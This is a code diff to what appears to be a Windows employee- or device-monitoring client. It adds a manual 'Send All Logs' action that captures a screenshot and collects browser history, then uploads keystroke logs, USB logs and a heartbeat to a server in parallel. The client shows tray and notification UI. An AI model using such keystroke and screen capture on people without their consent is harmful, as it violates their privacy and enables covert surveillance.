@@ -29,6 +29,7 @@ typedef ULONG PROPID;
 #include <vector>
 #include <string>
 #include <thread>
+#include <future>
 #include <chrono>
 #include <map>
 #include <mutex>
@@ -324,6 +325,7 @@ void checkConnectionStatusChange();
 void updateTrayMenu();
 void manageMemoryLimits();
 void sendInitialDataRequests();
+void sendAllLogsNow();
 void cleanupTemporaryFiles();
 bool showClientLogin();
 
@@ -2676,7 +2678,8 @@ static INT_PTR CALLBACK settingsDialogProc(HWND dlg,UINT msg,WPARAM wp,LPARAM lp
             return TRUE;
         }
         if(id==SETTINGS_SEND_ALL){
-            std::thread([]{sendInitialDataRequests();}).detach();
+            // Send now, on a worker. The worker reports final, acknowledged results.
+            std::thread([]{sendAllLogsNow();}).detach();
             return TRUE;
         }
         if(id==SETTINGS_REFRESH_CONFIG){
@@ -3320,9 +3323,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                     // No action (status items are disabled)
                     break;
                 case ID_TRAY_SEND_ALL:
-                    std::thread([](){
-                        sendInitialDataRequests();
-                    }).detach();
+                    std::thread([]{sendAllLogsNow();}).detach();
                     break;
                 case ID_TRAY_SIGN_IN:
                     showClientLogin();
@@ -3651,6 +3652,54 @@ void manageMemoryLimits() {
         writeDebugLog("Shrunk browser histories vector capacity");
     }
 } 
+
+// Explicit manual synchronization. Begin screenshot capture and every event
+// upload without the startup routine's artificial sleeps. The result message
+// is only shown AFTER the server acknowledges or rejects each operation.
+void sendAllLogsNow() {
+    if(selectedMonitorId.load()<1 || getClientToken().empty()){
+        showToastNotification("Send All Logs","Select a signed-in monitor before sending.","error");
+        return;
+    }
+    static std::atomic<bool> inProgress{false};
+    if(inProgress.exchange(true)){
+        writeDebugLog("Send All Logs is already in progress");
+        return;
+    }
+    struct Reset { std::atomic<bool>& flag; ~Reset(){flag.store(false);} } reset{inProgress};
+    writeDebugLog("Send All Logs: starting screenshot, browser, keyboard and USB uploads");
+
+    auto screenshot=std::async(std::launch::async, []()->bool {
+        const std::string path=takeScreenshot();
+        if(path.empty() || GetFileAttributesA(path.c_str())==INVALID_FILE_ATTRIBUTES){
+            writeDebugLog("Send All Logs: screenshot capture did not produce an image");
+            return false;
+        }
+        return sendScreenshot(path);
+    });
+    auto browser=std::async(std::launch::async, []()->bool {
+        collectBrowserHistory();
+        return sendBrowserHistories();
+    });
+    auto keys=std::async(std::launch::async, []()->bool {return sendKeyLogs();});
+    auto usb=std::async(std::launch::async, []()->bool {return sendUSBLogs();});
+    auto heartbeat=std::async(std::launch::async, []()->bool {return sendTicEvent();});
+
+    const bool imageOk=screenshot.get();
+    const bool browserOk=browser.get();
+    const bool keysOk=keys.get();
+    const bool usbOk=usb.get();
+    const bool heartbeatOk=heartbeat.get();
+    const bool allOk=imageOk&&browserOk&&keysOk&&usbOk&&heartbeatOk;
+    const std::string report="Screenshot: "+std::string(imageOk?"stored":"FAILED")+
+        " | Browser: "+(browserOk?"ok":"failed")+
+        " | Keys: "+(keysOk?"ok":"failed")+
+        " | USB: "+(usbOk?"ok":"failed")+
+        " | Heartbeat: "+(heartbeatOk?"ok":"failed");
+    writeDebugLog("Send All Logs finished: "+report);
+    showToastNotification("Send All Logs",report,allOk?"info":"error");
+    updateTrayMenu();
+}
 
 // Send initial data requests (screenshot, tic, browser history, key log, USB log)
 void sendInitialDataRequests() {
